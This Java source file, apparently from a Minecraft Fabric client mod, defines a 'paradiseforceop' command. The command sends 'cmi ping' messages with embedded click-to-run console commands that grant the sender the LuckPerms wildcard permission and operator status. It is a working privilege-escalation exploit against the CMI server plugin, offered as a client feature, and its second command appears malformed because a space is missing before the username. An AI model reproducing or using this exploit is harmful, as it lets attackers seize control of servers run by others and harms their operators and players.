package tk.milkthedev.paradiseclientfabric.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import tk.milkthedev.paradiseclientfabric.command.Command;

import java.util.Objects;

public class ForceOPCommand extends Command {
    public ForceOPCommand() {
        super("paradiseforceop", "Gives OP thru CMI console command sender exploit");
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes((context -> {
                    Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + MinecraftClient.getInstance().getSession().getUsername() +  " p set * true</CC>");
                    Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + MinecraftClient.getInstance().getSession().getUsername() +  "</CC>");
                    return SINGLE_SUCCESS;
                }));
    }
}
